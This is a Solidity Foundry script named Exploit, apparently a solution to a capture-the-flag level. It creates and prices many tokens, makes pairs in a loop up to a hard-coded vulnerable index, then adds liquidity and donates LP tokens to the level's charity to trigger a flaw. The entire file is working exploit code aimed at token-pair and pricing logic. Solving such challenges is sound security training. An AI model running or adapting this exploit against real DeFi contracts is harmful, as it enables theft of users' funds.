pragma solidity ^0.8.17;

import "forge-std/Test.sol";

interface ILevel {
    function flagCharity() external returns (address);
    function pairFactory() external returns (address);

    function donate(address token, uint256 amount) external;
    function createToken(string memory token_name, string memory token_symbol) external returns (address);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function listing(address token, uint256 price) external;
    function minting(address token, uint256 amount) external;
}

interface IPairFactory {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
}

interface IERC20 {
    function approve(address, uint256) external;
    function balanceOf(address) external returns (uint256);
}

uint256 constant TOKENS = 20;
uint256 constant VULNERABLE_INDEX = 79;

contract Exploit is Test {
    function run(address level_address) external {
        vm.startBroadcast();
        ILevel level = ILevel(level_address);
        vm.label(level_address, "Label");
        Inner inner = new Inner(level_address);

        uint256 count = 0;
        for (uint256 i = 0; count < VULNERABLE_INDEX; i++) {
            uint256 a = i / (TOKENS - 2) + 2;
            uint256 b = i % (TOKENS - 2) + 2;
            if (a >= b) {
                continue;
            }
            level.createPair(inner.tokens_(a), inner.tokens_(b));
            count++;
        }

        inner.step2();
        vm.stopBroadcast();
    }
}

contract Inner {
    address pairFactory;
    ILevel level;
    address[] public tokens_;

    constructor(address level_address) {
        level = ILevel(level_address);
        pairFactory = level.pairFactory();

        address[] memory tokens = new address[](TOKENS);
        // Create token a, b
        for (uint256 i = 0; i < TOKENS; i++) {
            string memory tokenName = "";
            uint256 toMint = 0;
            uint256 tokenPrice = 1;

            if (i == 0) {
                (toMint, tokenPrice) = (2000, 50 ether / 2000);
            } else if (i == 1 || i == 2) {
                (toMint, tokenPrice) = (20 ether, 1);
            } else {
                (toMint, tokenPrice) = (2000, 2000);
            }

            tokens[i] = createToken(tokenName, toMint, tokenPrice);
        }
        tokens_ = tokens;
    }

    function step2() external {
        // Create pair between tokens
        address[] memory tokens = tokens_;

        address p1 = level.createPair(tokens[1], tokens[2]);
        address p0 = level.createPair(tokens[0], tokens[3]);

        addLiquidity(pairFactory, tokens[0], tokens[3], 2000, 2000);
        addLiquidity(pairFactory, tokens[1], tokens[2], 20 ether, 20 ether);

        IERC20(p1).approve(address(level), type(uint256).max);
        level.donate(p1, IERC20(p1).balanceOf(address(this)));
    }

    function createToken(string memory name, uint256 mint, uint256 price) internal returns (address t) {
        t = level.createToken(name, name);
        level.listing(t, price);
        if (mint != 0) {
            level.minting(t, mint);
        }
        IERC20(t).approve(pairFactory, type(uint256).max);
    }

    function addLiquidity(address pair, address token0, address token1, uint256 mint0, uint256 mint1) internal {
        IPairFactory(pair).addLiquidity(token0, token1, mint0, mint1, 0, 0, address(this), type(uint256).max);
    }
}